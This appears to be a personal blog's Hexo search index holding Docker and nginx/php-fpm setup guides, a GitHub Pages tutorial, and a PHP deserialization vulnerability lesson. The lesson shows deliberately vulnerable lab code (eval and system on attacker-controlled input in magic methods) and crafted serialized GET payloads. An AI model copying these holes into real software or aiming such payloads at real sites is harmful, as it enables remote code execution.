<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker</title>
    <url>/2025/05/13/docker/</url>
    <content><![CDATA[初识Docker环境为Ubuntu

docker就是用于解决软件跨环境迁移的问题，docker简单来说就是装了软件及其运行环境的容器


ps:md,docker好几个源都不好用，我的&#x2F;etc&#x2F;docker&#x2F;daemon.json配置如下
/*配置如下*/&#123;  &quot;registry-mirrors&quot;: [    &quot;https://hub.fast360.xyz&quot;,    &quot;https://hub.rat.dev&quot;,    &quot;https://hub.littlediary.cn&quot;,    &quot;https://docker.kejilion.pro&quot;,    &quot;https://dockerpull.cn&quot;,    &quot;https://docker-0.unsee.tech&quot;,    &quot;https://docker.tbedu.top&quot;,    &quot;https://docker.1panelproxy.com&quot;,    &quot;https://docker.melikeme.cn&quot;,    &quot;https://cr.laoyou.ip-ddns.com&quot;,    &quot;https://hub.firefly.store&quot;,    &quot;https://docker.hlmirror.com&quot;,    &quot;https://docker.m.daocloud.io&quot;,    &quot;https://docker.1panel.live&quot;,    &quot;https://image.cloudlayer.icu&quot;,    &quot;https://docker.1ms.run&quot;  ],  &quot;insecure-registries&quot;: [],  &quot;debug&quot;: false,  &quot;experimental&quot;: false,  &quot;features&quot;: &#123;    &quot;buildkit&quot;: true  &#125;,  &quot;log-driver&quot;: &quot;json-file&quot;,  &quot;log-opts&quot;: &#123;    &quot;max-size&quot;: &quot;10m&quot;,    &quot;max-file&quot;: &quot;3&quot;  &#125;&#125;



Docker架构与容器化

比如想在docker主机上运行MySQL，在docker客户机上拉取MySQL镜像（docker pull MySQL），然后docker主机就会在应用市场&#x2F;仓库中下载MySQL镜像；
客户机上运行MySQL，执行run命令(docker run MySQL)，就会创建容器，容器中放着一个或者多个应用

也可以制作自己的镜像，docker build xxx,会放在docker主机的image中，也可以将这个镜像上传到应用市场中，
docker push xxx
命令命令-镜像操作
eg：下载一个nginx
先查看仓库中有没有nginx的镜像，sudo docker search nginx（search不走配置的镜像源所以会超时，在镜像名前加上 register.liberx.info/可以解决超时问题）
然后拉到docker主机，sudo docker pull nginx,pull默认是下载最新版本，下载指定版本nginx:版本号
查看自己的镜像列表：sudo docker images&#x2F;sudo docker image ls
命令-容器操作
查看运行中&#x2F;所有容器： sudo docker ps [-a]加上-a就会显示所有容器

UP表示上线，EXITED表示结束运行
sudo docker start/stop/stats后面加的是容器名字或者容器的id（id不一定全部输完只要能区分就行，但是名字不能模糊匹配）

删除容器：sudo docker rm [-f] 容器名/容器id，不加-f那么需要停止容器再删除，-f表示强制删除
可以用$传入id
sudo docker rm -f $(sudo docker ps -aq) -aq是显示所有容器的ID
命令-run，exec运行的docker容器名字一坨，一run就阻塞终端，怎么办？
sudo docker run -d --name 想要指定的容器名 镜像名

-d表示后台运行，–name（是两个杠）给容器指定一个名字
既然占用80端口了，计网里学的80是web服务端口，那么想必可以可以用浏览器访问吧

虽然nginx运行了，还占用的80端口（web服务默认端口），但是在浏览器直接访问docker host的ip行不通

为什么会这样呢？


原因是占用的80端口只是容器的80端口而不是主机的80端口（前面说的容器就像一个更简化的虚拟机，内部的端口自然与外部主机的端口不一样），所以我们需要进行端口映射
-p 外部端口:内部端口（非常重要！！！！！）

将主机的80端口映射到容器的80端口
这下访问到nginx的主页了

怎么修改默认的这个页面呢？dockerhub中会描述镜像的默认初始页面（usr&#x2F;share&#x2F;nginx&#x2F;html）（我上不去啊）
sudo docker exec -it 容器名 /bin/bash  -it表示交互模式，&#x2F;bin&#x2F;bash表示以终端方式进入这个容器

exit退出
命令-镜像操作
sudo docker commit [选项] 选定容器 镜像
-a, --author：设置镜像作者信息。-c, --change：应用 Dockerfile 指令来创建镜像。-m, --message：提交时的说明信息。-p, --pause：在提交之前暂停容器的运行（默认为 true）

比如将前面的运行nginx的容器提交为新镜像
sudo docker commit -m &quot;commit-test&quot; -a &quot;wwwtty&quot; myNginx committest

镜像保存为一个tar文件
sudo docker save [-o 文件名.tar] 镜像名
sudo docker load -i tar包名字
load下来后就是一个镜像，直接run就可以启动容器


sudo docker login
需要有dockerhub账号
sudo docker tag 原镜像名 目标镜像名
sudo docker push 目标镜像名
存储容器内部对文件修改困难（没有vi&#x2F;vim），而且如果容器炸了或者容器重新启动就丢失修改
目录挂载

外部的目录像u盘一样 -v 外部目录:内部目录
比如将~下的html目录作为外部目录,nginx默认页面所在目录作为内部目录
sudo docker run -d --name test -p 80:80 -v ~/html:/usr/share/nginx/html nginx
这样访问服务器ip出来的就是自己预设的页面
卷映射如果想通过修改外部文件就能实现对内部配置文件的修改，需要使用卷映射
为什么不能使用目录挂载呢，因为目录挂载如果目录不存在，会先在外部创建一个空文件夹，那么挂载空文件夹，相当于启动时配置项全是空的，就启动不了容器
-v 卷名:容器中配置文件路径
卷的位置 /var/docker/volumes/卷名
显示所有的卷：sudo docker volume ls
创建卷：sudo docker volume create 卷名
显示卷的详细信息：sudo docker volume inspect 卷名
网络容器间访问怎么实现一个容器访问另一个容器？




1.可以通过run的-v端口映射
我有以下两个run起来的容器

假设从test1访问test
 sudo docker exec -it test1 bash 
sudo curl 175.27.249.106:80 
终端就会出现html

但是这样做很奇怪，相当于从test1的88端口-&gt;docker host的80端口-&gt;test的80端口，绕了一大圈
有一个叫做docker0的默认网络



查看容器细节：sudo docker container inspect 容器名/sudo docker inspect 容器名

接下来就可以通过显示出的IP地址进行访问（docker为每个容器分配唯一IP，通过ip+容器端口可以互相访问）
从test0访问test1

ubuntu@VM-0-9-ubuntu:~$ sudo docker exec -it test0 bashroot@8656267b120d:/# curl http://172.17.0.3:80 #test1容器的ip和端口


这样做也有缺点，ip是会变动的


创建自定义网络
创建mynet：sudo docker network create mynet

将容器加入自己的网络下（–network 网络名） sudo docker run -d --name test0 -p 80:80 --network mynet nginx
sudo docker inspect test0:

这样一来，容器间访问只需要进入容器-&gt;curl http://容器名:容器端口
Docker compose

上线：第一次创建并启动
下线：移除创建的容器以及相关资源
不用compose.yaml启动wordpress和mysql
#启动mysqldocker run -d -p 3306:3306 \-e MYSQL_ROOT_PASSWORD=123456 \-e MYSQL_DATABASE=wordpress \-v mysql-data:/var/lib/mysql \-v /app/myconf:/etc/mysql/conf.d \--restart always --name mysql \--network blog \mysql:8.0#启动wordpressdocker run -d -p 8080:80 \-e WORDPRESS_DB_HOST=mysql \-e WORDPRESS_DB_USER=root \-e WORDPRESS_DB_PASSWORD=123456 \-e WORDPRESS_DB_NAME=wordpress \-v wordpress:/var/www/html \--restart always --name wordpress-app \--network blog \wordpress:latest

compose.yaml格式：
name:项目名services:	应用名:		container_name: 容器名（不指定默认:项目名_应用名）		environment:			环境配置（docker run的-e），格式如 - WORDPRESS_DB_HOST=mysql 或 WORDPRESS_DB_HOST: mysql		networks:			- 网络名		ports:			- &quot;端口映射&quot;		restart:			always /……		volumes:			- 目录挂载或卷映射networks:	网络名:		更详细的配置volumes:	卷名:		更详细的配置

启动(上线)命令：sudo docker compose -f compose.yaml up -d
-d:后台运行
-f:指定yaml文件
下线命令：sudo docker compose -f compose.yaml down
如果更改了compose.yaml文件的配置，重新上线，没有被更改的应用会保持running状态；
下线并不会移除对应的卷
Dockerfiledockerfile制作镜像

比如将app.jar打包成镜像
FROM openjdk:17LABEL author=wwwttyEXPOSE 8080 #容器暴露8080端口COPY app.jar /app.jar #容器相当于一个新的操作系统要放在根目录下ENTRYPOINT java -jar app.jar#更推荐下面的写法ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;]

制作镜像命令：docker build -f dockerfile -t 镜像名:版本 ./要指明当前的目录.&#x2F;
镜像分层存储

使用docker history 镜像名查看容器构建历史（过程自下而上）
也可以使用 docker image inspect 镜像名查看更详细的信息
官方的nginx镜像（docker history）：

（docker image inspect）展现的层级:

进行目录挂载后的容器再commit的镜像：

发现多了1.09kb
（docker image inspect）展现的层级:

比官方的多了一层，多的一层就是挂载的目录
分层视角下的容器与镜像


容器就是在镜像层（只读）加上一层读写层，对容器的修改都是在可读可写层进行，所以删除容器修改都会丢失（因为读写层没了）
这样的好处是容器隔离：

可以用 docker ps -s/--size 查看读写层和只读层的关系

SIZE列 前面是读写层大小括号内是镜像大小
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用docker搭建nginx以及php-fpm</title>
    <url>/2025/05/25/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
参考了docker部署php和nginx环境_docker nginx php-CSDN博客
编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
OS：centOS 7.9 64位
要点
最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
自己创建目录结构尽量明了
nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
php.ini需要自己创建
挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
nginx的default.conf和nginx.conf一定要配置正确
有问题多看日志，多拿错误日志信息问问ai（

过程创建自己的网络docker network create mynet


 后续php容器，nginx容器加入该网络
创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm



1.参数说明：-d 后台运行 –name 给容器取个名字


路径设置


使用docker cp命令：
将容器中路径的内容复制到docker host路径中
docker cp 容器名:路径 目的路径
nginx的配置文件位于&#x2F;etc&#x2F;nginx
nginx的日志文件位于&#x2F;var&#x2F;log
php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

编辑

将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx

mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx



 用tree &#x2F;data看一下目录层级有没有正确
如果没有安装tree
yum install tree


编辑
复制php配置文件
编辑

进入php容器，可以用:
php -i | grep php.ini
得到配置文件路径
&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./


做完以上操作后，目录层级结构如下：

编辑
做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
#工作路径/datamv ./php/php.ini-development ./php/php.ini


 修改后如下
编辑
然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
mkdir ./wwwtouch ./www/index.html


 目录层级如下
 编辑
删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)


创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx



\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
\2.    配置文件一定要正确挂载
\3.    –network表示加入自己创建的网络mynet

php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm



\1.    php和nginx的初始页面必须挂载到同一路径
​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
\2.    –network表示加入自己创建的网络mynet

修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;



我们需要更改：

将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
在location \块中，index中增加index.php
将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;


修改nginx.conf在http块中把default.conf的内容复制进去
#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;


测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
随便写点html进去
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;


 编辑
若正常显示，证明目录挂载没有出错
如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
检查php能否被解析创建index.php，写入
&lt;?php phpinfo();?&gt;



如果在浏览器中输入：
http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php

有以下结果
编辑
证明配置成功
出现的问题以及解决

nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>nginx</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建自己的GitHub-page</title>
    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;


验证ssh -T git@github.com


新建自己的仓库








下载git下载链接:https://git-scm.com/downloads/win
参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755

搭建本地博客创建博客目录
安装hexonpm install -g hexo/cli


#创建一个新的hexo项目hexo init myblogs


此时的目录结构


cd myblogsnpm install

此时项目结构

运行hexo项目
hexo server


部署到github获取个人token






打开_config.yml

编辑_config.yml
当前博客目录安装git插件npm install hexo-deployer-git --save

最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy


博客路径
博客配置项在_config.yml中
修改浏览器tab页标题

#部署到githubhexo g -d


]]></content>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞</title>
    <url>/2025/05/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[反序列化漏洞成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象
php面向对象基础知识php中类和对象的写法class Test&#123;	var $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）	var $id;	function __construct($name = null,$id = null)&#123;//构造函数		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;class Test&#123;	var $name;	var $id;	function __construct($name = null,$id = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;$a = new Test();$a-&gt;name=&#x27;senpai&#x27;;$a-&gt;id=114514;print_r($a);/*print_r()打印对象实例的结果就是:&gt;Test Object(    [name] =&gt; senpai    [id] =&gt; 114514)[Finished in 852ms]*/

php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this-&gt;成员变量名
序列化
可以进行序列化的内容：
对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null
不能序列化的内容：
类，资源（比如数据库连接），未定义类型

字符串长度用于确定头尾双引号位置，防止出现 &quot;benben&quot;adada&quot;这种中间带有双引号报错的情况

a:参数数量:&#123;i:索引;对应的序列化内容;&#125;


O:类名长度:&quot;类名&quot;:变量数:&#123;s:变量名长度:&quot;变量名&quot;;变量值的序列化内容;&#125;
private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)
protected属性的成员变量序列化后，变量名前会加上0x00*0x00
&lt;?php	class Test&#123;		public $name;		private $id;	&#125;	$a = 1;	$b = &#x27;hello world!&#x27;;	$c = new Test();	$d = [1,2,3,4];	$e = 1.14514;	$f = null;	echo serialize($a).&quot;\n&quot;;	echo serialize($b).&quot;\n&quot;;	echo serialize($c).&quot;\n&quot;;	echo serialize($d).&quot;\n&quot;;	echo serialize($e).&quot;\n&quot;;	echo serialize($f);?&gt;/*i:1;s:12:&quot;hello world!&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;&lt;0x00&gt;Test&lt;0x00&gt;id&quot;;N;&#125;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;&#125;d:1.14514;N;   [Finished in 1.1s]*/



反序列化反序列化就是将字符串变成对象 unserialize(string $str)


例题
get方法传进来的变量benben就是序列化字符串

/*自动把get请求收到的参数拼接到序列化字符串中*/$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:&#x27;.strlen($_GET[&#x27;benben&#x27;]).&#x27;:&quot;&#x27;.$_GET[&#x27;benben&#x27;].&#x27;&quot;;&#125;&#x27;;

构造url，用?传递get请求的参数(这里我让他弹窗)
?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;echo &quot;&lt;script&gt;alert(123);&lt;/script&gt;&quot;;&quot;;&#125;
使用var_dump()打印对象细节&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	var_dump($a);?&gt;/*object(Test)#1 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;   [Finished in 933ms]*/

&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;//复制echo内容	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

/**/&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;德川&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;�Test�name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;�*�sex&quot;;s:3:&quot;男&quot;;&#125;object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;德川&quot; 输出德川而不是最开始的淳平，因为更改了序列化字符串  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

魔术方法魔术方法：在特定条件下自动触发的方法
触发前提：魔术方法所在的类或对象被调用

魔术方法必须掌握触发时机，参数，返回值

常见魔术方法

构造与析构/*构造触发时机:当new对象时自动调用（构造器）功能:初始化对象参数:非必要返回值:无*/function __construct(args...);/*析构触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行功能:参数:无返回值:无*/function __destruct();&lt;?phpclass Test&#123;	public $name;	public function __construct()&#123;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test();//触发__construct();$str  = serialize($a);$str1 = &#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;&#x27;;$f = unserialize($str1); //触发__destruct();?&gt;//触发__destruct();    /*结果构造函数析构函数析构函数*/

unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象
&lt;?phpclass Test&#123;	public $name;	public function __construct($name = null)&#123;		$this-&gt;name = $name;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test(&#x27;淳平&#x27;);$str  = serialize($a);$f = unserialize($str);//$a被销毁了echo $a-&gt;name;//这里会警告$a为null?&gt;

漏洞例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot;;	public function __destruct()	&#123;		eval($this-&gt;cmd);//漏洞在这	&#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);//会在这调用__destruct()?&gt;

需要构造序列化字符串，将$cmd改成要执行的php命令
/*构造字符串*/$str = &#x27;O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;&#x27;;

构造url，拼接参数?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;到localhost/ser后
sleep先进行__sleep()再serialize()

function __sleep();/*返回要序列化的属性名的数组触发时机：执行serialize()之前功能：返回需要被序列化的成员参数：无返回值：包含需要被序列化的成员属性名的数组*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public  function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);//返回包含属性名的数组	&#125;	&#125;$a = new User(&#x27;淳平&#x27;,114514,&#x27;114514&#x27;);echo serialize($a);//结果中将不会有password-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - /*O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;*/

例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	const SITE = &#x27;uusama&#x27;;	public $username;	public $nickname;	private $password;	public function __construct($username, $nickname, $password)	&#123;		$this-&gt;username = $username;		$this-&gt;nickname = $nickname;		$this-&gt;password = $password;	&#125;	public function __sleep()	&#123;		system($this-&gt;username);//漏洞	&#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;

因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行
wakeup
function __wakeup();/*触发时机：unserialize()之前功能：参数：返回值：*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);	&#125;	public function __wakeup()&#123;		$this-&gt;password = &#x27;114514&#x27;;//反序列化前调用，给password赋值	&#125;&#125;$str = &#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;&#x27;;//没有passwordvar_dump(unserialize($str));//password有值了?&gt;/*object(User)#1 (3) &#123;  [&quot;name&quot;]=&gt;  string(6) &quot;淳平&quot;  [&quot;id&quot;]=&gt;  int(114514)  [&quot;password&quot;:&quot;User&quot;:private]=&gt;  string(6) &quot;114514&quot;&#125;*/

